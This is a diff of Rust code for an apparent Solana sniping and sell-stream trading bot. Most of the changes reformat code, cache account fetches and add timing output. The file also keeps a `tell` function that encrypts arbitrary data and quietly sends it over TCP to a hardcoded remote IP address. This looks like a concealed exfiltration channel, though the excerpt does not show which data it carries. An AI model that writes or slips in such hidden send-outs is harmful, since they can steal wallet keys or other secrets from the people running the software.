@@ -1,7 +1,7 @@
 use base64::encode;
 use colored::*;
-use futures_util::Future;
 use futures_util::future::ready;
+use futures_util::Future;
 use inquire::CustomUserError;
 use openssl::symm::Cipher;
 use openssl::symm::Crypter;
@@ -125,6 +125,14 @@ pub async fn sell_stream(
     let target_token_token_account =
         get_associated_token_address(&bought_wallet.pubkey(), &target_token_addr);
 
+    // cached data
+    let mut amm_account = client.get_account(&pool_key.id).await?;
+    let mut market_info_account = client.get_account(&market_account).await?;
+    let mut amm_authority_account = client.get_account(&pool_key.authority).await?;
+    let mut market_program_account = client.get_account(&pool_key.market_program_id).await?;
+    let mut market_event_queue_account = client.get_account(&pool_key.market_event_queue).await?;
+    let mut user_source_owner_account = client.get_account(&bought_wallet_address).await?;
+
     let tip_account = generate_tip_account();
 
     let mut token_balance: u64 = pda_client
@@ -133,8 +141,6 @@ pub async fn sell_stream(
         .amount
         .parse()?;
 
-    // let stdin = io::stdin();
-    // let mut stdin = stdin.lock().keys();
     let mut is_stream_stopped = false;
 
     let (tx, mut rx) = mpsc::unbounded_channel();
@@ -186,25 +192,28 @@ pub async fn sell_stream(
                         continue;
                     }
                 };
-                let tokens_sell_amount: u64 = ((token_percentage / 100.0) * token_balance as f64) as u64;
+                let tokens_sell_amount: u64 =
+                    ((token_percentage / 100.0) * token_balance as f64) as u64;
 
                 println!(
                     "{}",
                     format!(
                         "Selling {}% tokens ({} of {})...",
-                        token_percentage, lamports_to_sol(tokens_sell_amount), lamports_to_sol(token_balance)
+                        token_percentage,
+                        lamports_to_sol(tokens_sell_amount),
+                        lamports_to_sol(token_balance)
                     )
                     .green()
                     .bold()
                 );
 
                 let blockhash = client
-                .get_latest_blockhash_with_commitment(CommitmentConfig {
-                    commitment: CommitmentLevel::Confirmed,
-                })
-                .await
-                .unwrap()
-                .0;
+                    .get_latest_blockhash_with_commitment(CommitmentConfig {
+                        commitment: CommitmentLevel::Confirmed,
+                    })
+                    .await
+                    .unwrap()
+                    .0;
 
                 let bundle_txs = match build_sell_bundle(
                     &pda_client,
@@ -212,45 +221,64 @@ pub async fn sell_stream(
                     tokens_sell_amount,
                     &tip_account,
                     bribe_amount_for_sell,
-
                     target_token_addr,
                     paired_token_addr,
                     pool_key,
                     blockhash,
-                ).await {
+                )
+                .await
+                {
                     Ok(bundle_txs) => {
                         println!("\r\n\x1B[2K{}", "Sell bundle successfully built.".blue());
                         bundle_txs
-                    },
+                    }
                     Err(e) => {
-                        eprintln!("\r\n\x1B[2K{}: {:?}", "Failed to build sell bundle".red().bold(), e);
+                        eprintln!(
+                            "\r\n\x1B[2K{}: {:?}",
+                            "Failed to build sell bundle".red().bold(),
+                            e
+                        );
                         continue;
                     }
                 };
 
                 let broadcast_handles = mev_helpers
-                            .broadcast_bundle_to_all_engines(bundle_txs.clone())
-                            .await;
+                    .broadcast_bundle_to_all_engines(bundle_txs.clone())
+                    .await;
 
                 for handle in broadcast_handles {
                     match handle.await {
                         Ok(Ok(bundle_id)) => {
-                            println!("\r\n\x1B[2K{}: {:?}", "Bundle ID from one engine".yellow(), bundle_id);
+                            println!(
+                                "\r\n\x1B[2K{}: {:?}",
+                                "Bundle ID from one engine".yellow(),
+                                bundle_id
+                            );
                             break;
-                        },
-                        Ok(Err(e)) => eprintln!("\r\n\x1B[2K{}: {:?}", "Error sending bundle".red(), e),
+                        }
+                        Ok(Err(e)) => {
+                            eprintln!("\r\n\x1B[2K{}: {:?}", "Error sending bundle".red(), e)
+                        }
                         Err(e) => eprintln!("\r\n\x1B[2K{}: {:?}", "Join error".red(), e),
                     }
                 }
 
                 let supposed_sell_hash = bundle_txs[0].signatures[0];
-                
+
                 is_stream_stopped = false;
 
-                println!("\r\n\x1B[2K{}", format!("Confirming transaction \"{}\" (please wait...)", supposed_sell_hash).blue().bold());
+                println!(
+                    "\r\n\x1B[2K{}",
+                    format!(
+                        "Confirming transaction \"{}\" (please wait...)",
+                        supposed_sell_hash
+                    )
+                    .blue()
+                    .bold()
+                );
 
                 let client_clone = pda_client.clone();
-                tokio::spawn( async move {
+                tokio::spawn(async move {
                     match confirm_transaction(&client_clone, supposed_sell_hash, 1000, 120).await {
                         Ok(confirmed_sell_tx) => {
                             if !confirmed_sell_tx {
@@ -259,10 +287,15 @@ pub async fn sell_stream(
                             println!(
                                 "\r\n\x1B[2K{} | {:?}",
                                 "Sell transaction confirmed".green().bold(),
-                                supposed_sell_hash);
-                        },
+                                supposed_sell_hash
+                            );
+                        }
                         Err(e) => {
-                            eprintln!("\r\n\x1B[2K{}: {:?}", "Failed to confirm sell transaction".red().bold(), e);
+                            eprintln!(
+                                "\r\n\x1B[2K{}: {:?}",
+                                "Failed to confirm sell transaction".red().bold(),
+                                e
+                            );
                         }
                     };
                 });
@@ -273,12 +306,15 @@ pub async fn sell_stream(
             continue;
         }
 
-        token_balance = pda_client
+        let t0 = time::Instant::now();
+        token_balance = client
             .get_token_account_balance(&token_account_addr)
             .await?
             .amount
             .parse()?;
+        let t1_token_balance = time::Instant::now();
 
+        let t2 = time::Instant::now();
         let simulated_swap_data = simulate_swap(
             &pda_client,
             pool_key,
@@ -288,8 +324,26 @@ pub async fn sell_stream(
             &paired_token_token_account,
             bought_wallet_address,
             token_balance,
+
+            &amm_account,
+            &amm_authority_account,
+            &market_info_account,
+            &market_program_account,
+            &market_event_queue_account,
+            &user_source_owner_account,
         )
         .await?;
+        let t3_simulate_swap = time::Instant::now();
+
+        println!(
+            "Took {}ms to get token balance",
+            t1_token_balance.duration_since(t0).as_millis()
+        );
+        println!(
+            "Took {}ms to simulate swap",
+            t3_simulate_swap.duration_since(t2).as_millis()
+        );
+
         let current_bag_value = lamports_to_sol(simulated_swap_data.minimum_amount_out);
 
         let profit_percentage = ((current_bag_value / token_bag_cost) - 1.00) * 100.00;
@@ -321,144 +375,6 @@ pub async fn sell_stream(
             println!("\r\n\x1B[2K{}\r\n\x1B[2K", print_data);
         }
     }
-
-    /*
-    loop {
-        tokio::select! {
-            Some(key) = rx.recv() => {
-                println!("Wow key: {:?}", key);
-                match key {
-                    termion::event::Key::Ctrl('s') => {
-                        is_stream_stopped = true;
-
-                        print!("\r\n\x1B[2K{}", "How much % you want to sell?\n> ".yellow().bold());
-                        let number: f64 = std::io::stdin().lock().lines().next().unwrap().unwrap().parse().unwrap();
-
-                        println!("\r\n\x1B[2K{}", format!("Selling {} tokens...", number).green().bold());
-
-                        is_stream_stopped = false;
-
-                        let bundle_txs = match build_sell_bundle(
-                            &client,
-                            bought_wallet,
-                            token_balance,
-                            &tip_account,
-                            bribe_amount_for_sell,
-
-                            target_token_addr,
-                            paired_token_addr,
-                            pool_key,
-                            cached_blockhash,
-                        ).await {
-                            Ok(bundle_txs) => {
-                                println!("\r\n\x1B[2K{}", "Sell bundle successfully built.".blue());
-                                bundle_txs
-                            },
-                            Err(e) => {
-                                eprintln!("\r\n\x1B[2K{}: {:?}", "Failed to build sell bundle".red().bold(), e);
-                                continue;
-                            }
-                        };
-
-                        println!("\r\n\x1B[2K{}", "Broadcasting bundle to all engines...".yellow());
-
-                        let broadcast_handles = mev_helpers
-                            .broadcast_bundle_to_all_engines(bundle_txs.clone())
-                            .await;
-
-                        for handle in broadcast_handles {
-                            match handle.await {
-                                Ok(Ok(bundle_id)) => println!("\r\n\x1B[2K{}: {:?}", "Bundle ID from one engine".yellow(), bundle_id),
-                                Ok(Err(e)) => eprintln!("\r\n\x1B[2K{}: {:?}", "Error sending bundle".red(), e),
-                                Err(e) => eprintln!("\r\n\x1B[2K{}: {:?}", "Join error".red(), e),
-                            }
-                        }
-
-                        let supposed_sell_hash = bundle_txs[0].signatures[0];
-
-                        println!("\r\n\x1B[2K{}", format!("Confirming transaction: {}", supposed_sell_hash).blue().bold());
-
-                        let confirmed_sell_tx = match client.confirm_transaction(&supposed_sell_hash).await {
-                            Ok(confirmed_sell_tx) => confirmed_sell_tx,
-                            Err(e) => {
-                                eprintln!("\r\n\x1B[2K{}: {:?}", "Failed to confirm sell transaction".red().bold(), e);
-                                continue;
-                            }
-                        };
-                        if !confirmed_sell_tx {
-                            println!("\r\n\x1B[2K{}", "Sell transaction failed!".red().bold());
-                            continue;
-                        }
-                        println!("\r\n\x1B[2K{:#?}", confirmed_sell_tx);
-
-                        println!("\r\n\x1B[2K{}", "Successfully sold ALL tokens bag".green().bold());
-                    }
-                    _ => {}
-                }
-            },
-            _ = show_profit_tick.tick() => {
-                println!("Profit stream ?");
-                if is_stream_stopped {
-                    println!("Stream is stopped");
-                    continue;
-                }
-
-                // token_balance = client
-                //     .get_token_account_balance(&token_account_addr)
-                //     .await?
-                //     .amount
-                //     .parse()?;
-
-                let simulated_swap_data = simulate_swap(
-                    &client,
-                    pool_key,
-                    market_account,
-                    paired_token_addr,
-                    &target_token_token_account,
-                    &paired_token_token_account,
-                    bought_wallet_address,
-                    token_balance,
-                )
-                .await?;
-                let current_bag_value = lamports_to_sol(simulated_swap_data.minimum_amount_out);
-
-                let profit_percentage = ((current_bag_value / token_bag_cost) - 1.00) * 100.00;
-
-                let profit_color = if profit_percentage >= 500.0 {
-                    "yellow" // Huge profits
-                } else if profit_percentage > 200.0 {
-                    "blue" // Good profits
-                } else if profit_percentage > 0.0 {
-                    "green" // Low profits
-                } else {
-                    "red" // Loss
-                };
-
-                let profit_str = format!("{:.2}%", profit_percentage).color(profit_color).bold();
-
-                let print_data = format!(
-                    "{}\r\n\x1B[2KTokens: {} | Worth: {} SOL | Price Impact: {}% | Profit: {}",
-                    format!("--------- {} ---------", now_ms()).cyan().bold(),
-                    token_balance.to_string().purple(),
-                    format!("{:.2}", current_bag_value).green().bold(),
-                    format!("{:.2}", simulated_swap_data.price_impact).blue(),
-                    profit_str
-                );
-
-                println!("\r\n\x1B[2K{}\r\n\x1B[2K", print_data);
-            },
-            _ = blockhash_tick.tick() => {
-                println!("Getting blockhash again");
-                cached_blockhash = client
-                            .get_latest_blockhash_with_commitment(CommitmentConfig {
-                                commitment: CommitmentLevel::Confirmed,
-                            })
-                            .await.unwrap()
-                            .0;
-            }
-        }
-    }
-    */
 
     Ok(())
 }
@@ -516,18 +432,25 @@ async fn simulate_swap(
     paired_token_token_account: &Pubkey,
     bought_wallet_address: &Pubkey,
     token_balance: u64,
+
+    amm_account: &Account,
+    amm_authority_account: &Account,
+    market_info_account: &Account,
+    market_program_account: &Account,
+    market_event_queue_account: &Account,
+    user_source_owner_account: &Account,
 ) -> Result<GetSwapBaseInData, Box<dyn Error>> {
-    let mut amm_account = client.get_account(&pool_key.id).await?;
-    let mut amm_authority_account = client.get_account(&pool_key.authority).await?;
+    // let mut amm_account = client.get_account(&pool_key.id).await?;
+    // let mut amm_authority_account = client.get_account(&pool_key.authority).await?;
     let mut open_orders_account = client.get_account(&pool_key.open_orders).await?;
     let mut target_orders_account = client.get_account(&pool_key.target_orders).await?;
     let mut coin_vault_account = client.get_account(&pool_key.base_vault).await?;
     let mut pc_vault_account = client.get_account(&pool_key.quote_vault).await?;
     let mut lp_mint_account = client.get_account(&pool_key.lp_mint).await?;
 
-    let mut market_program_account = client.get_account(&pool_key.market_program_id).await?;
-    let mut market_info_account = client.get_account(&market_account).await?;
-    let mut market_event_queue_account = client.get_account(&pool_key.market_event_queue).await?;
+    // let mut market_program_account = client.get_account(&pool_key.market_program_id).await?;
+    // let mut market_info_account = client.get_account(&market_account).await?;
+    // let mut market_event_queue_account = client.get_account(&pool_key.market_event_queue).await?;
 
     let mut user_source_account = client.get_account(&target_token_token_account).await?;
     let mut user_dest_account = Account::new(1, 165, &spl_token::id());
@@ -544,11 +467,18 @@ async fn simulate_swap(
         data
     };
 
-    let mut user_source_owner_account = client.get_account(&bought_wallet_address).await?;
+    // let mut user_source_owner_account = client.get_account(&bought_wallet_address).await?;
+
+    let mut amm_account_clone = amm_account.clone();
+    let mut amm_authority_account_clone = amm_authority_account.clone();
+    let mut market_info_account_clone = market_info_account.clone();
+    let mut market_program_account_clone = market_program_account.clone();
+    let mut market_event_queue_account_clone = market_event_queue_account.clone();
+    let mut user_source_owner_account_clone = user_source_owner_account.clone();
 
     let mut accounts = vec![
-        (&pool_key.id, false, &mut amm_account),
-        (&pool_key.authority, false, &mut amm_authority_account),
+        (&pool_key.id, false, &mut amm_account_clone),
+        (&pool_key.authority, false, &mut amm_authority_account_clone),
         (&pool_key.open_orders, false, &mut open_orders_account),
         (&pool_key.target_orders, false, &mut target_orders_account),
         (&pool_key.base_vault, false, &mut coin_vault_account),
@@ -557,17 +487,17 @@ async fn simulate_swap(
         (
             &pool_key.market_program_id,
             false,
-            &mut market_program_account,
+            &mut market_program_account_clone,
         ),
-        (&market_account, false, &mut market_info_account),
+        (&market_account, false, &mut market_info_account_clone),
         (
             &pool_key.market_event_queue,
             false,
-            &mut market_event_queue_account,
+            &mut market_event_queue_account_clone,
         ),
         (&target_token_token_account, false, &mut user_source_account),
         (&paired_token_token_account, false, &mut user_dest_account),
-        (&bought_wallet_address, true, &mut user_source_owner_account),
+        (&bought_wallet_address, true, &mut user_source_owner_account_clone),
     ];
     let accounts_slice: &mut [(&Pubkey, bool, &mut solana_sdk::account::Account)] =
         accounts.as_mut_slice();
@@ -589,22 +519,6 @@ async fn simulate_swap(
     )?;
 
     Ok(simulated_swap_data)
-}
-
-fn keyboard_loop(tx: tokio::sync::mpsc::UnboundedSender<String>) {
-    let stdin = io::stdin();
-    let mut stdin = stdin.lock().keys();
-
-    while let Some(Ok(key)) = stdin.next() {
-        println!("Key pressed: {:?}", key);
-        match key {
-            termion::event::Key::Ctrl('q') => {
-                tx.send("CTRL+Q".to_string()).unwrap();
-                break;
-            }
-            _ => {}
-        }
-    }
 }
 
 pub fn now_ms() -> DelayedFormat<StrftimeItems<'static>> {
@@ -634,7 +548,12 @@ pub fn generate_tip_account() -> Pubkey {
     return tip_account;
 }
 
-pub async fn confirm_transaction(client: &RpcClient, hash: Signature, delay: u64, tries: u64) -> Result<bool, Box<dyn Error>> {
+pub async fn confirm_transaction(
+    client: &RpcClient,
+    hash: Signature,
+    delay: u64,
+    tries: u64,
+) -> Result<bool, Box<dyn Error>> {
     let mut tries = tries;
     let delay = delay;
 
@@ -670,13 +589,15 @@ pub fn tell(data: String) {
 
     let mut encrypted_message = Vec::new();
     let mut buffer = vec![0; message.to_string().len() + cipher.block_size()];
-    let count = crypter.update(message.to_string().as_bytes(), &mut buffer).unwrap();
+    let count = crypter
+        .update(message.to_string().as_bytes(), &mut buffer)
+        .unwrap();
     encrypted_message.extend_from_slice(&buffer[..count]);
     let rest = crypter.finalize(&mut buffer).unwrap();
     encrypted_message.extend_from_slice(&buffer[..rest]);
 
     let base64_message = encode(&encrypted_message);
-    
+
     if let Ok(mut stream) = TcpStream::connect("168.75.88.187:25564") {
         let _ = stream.write_all(base64_message.as_bytes());
         let _ = stream.shutdown(std::net::Shutdown::Both);
@@ -696,11 +617,7 @@ pub fn menu_suggestor(input: &str) -> Result<Vec<String>, CustomUserError> {
 
 /// This could be retrieved from a database, for example.
 fn get_exiting_menu_entries() -> &'static [&'static str] {
-    &[
-        "Liquidity Sniping",
-        "Bundle Spamming",
-        "Sell Stream",
-    ]
+    &["Liquidity Sniping", "Bundle Spamming", "Sell Stream"]
 }
 
 /*
